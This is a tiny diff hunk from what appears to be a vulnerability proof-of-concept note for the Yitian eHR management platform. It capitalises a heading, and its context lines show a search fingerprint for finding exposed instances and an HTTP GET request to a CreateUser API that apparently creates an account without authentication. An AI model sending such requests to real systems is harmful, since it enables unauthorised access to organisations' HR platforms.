@@ -8,7 +8,7 @@
 body="易天智能eHR管理平台"
 ```
 
-## poc
+## POC
 
 ```
 GET /BaseManage/UserAPI/CreateUser?Account=stc&Password=123456&OuterID=888 HTTP/1.1
